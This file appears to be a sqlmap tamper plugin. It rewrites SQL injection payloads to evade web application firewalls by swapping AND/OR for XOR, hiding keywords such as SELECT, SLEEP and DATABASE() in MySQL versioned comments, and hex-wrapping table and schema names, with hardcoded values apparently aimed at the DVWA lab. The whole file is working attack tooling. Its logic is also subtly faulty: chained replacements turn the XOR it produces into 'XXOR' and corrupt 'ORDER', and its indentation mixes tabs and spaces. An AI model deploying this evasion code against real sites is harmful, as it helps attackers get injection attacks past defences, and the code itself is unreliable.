import re
import os

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

test3 = ['sleep','(1)','SLEEP','(2)','(3)','(4)','(5)','(0)','DATABASE','()']

def dependencies():
    pass

def tamper(payload, **kwargs):
    payload = payload.replace('AND','XOR')
    payload = payload.replace('OR','XOR')
    payload = payload.replace("ASCII", "/*!ASCII*/")
    payload = payload.replace('SELECT','/*!11440SELECT*/')
    payload = payload.replace('USER()','USER/*!77777a*/()')
    payload = payload.replace('DATABASE()','DATABASE/*!77777a*/()')
    payload = payload.replace('TABLE_NAME','hex(TABLE_NAME)')
    payload = payload.replace('SCHEMA_NAME','hex(SCHEMA_NAME)')
    for test2 in test3:
    	payload = payload.replace(test2, "/*!" + test2 + "*/")
    payload = payload.replace("table_name=0x7573657273 XOR table_schema=0x64767761","table_name=0x7573657273 %26%26 table_schema=0x64767761")
    try:
        pattern = re.compile(r'(.*?)XOR(.*?)XOR(.*)')
        test = re.search(pattern,payload)
        payload = payload.replace(test.group(3)," '")
    except:
	pass
    payload = payload.replace(" ORDER BY `user`","")
    return payload
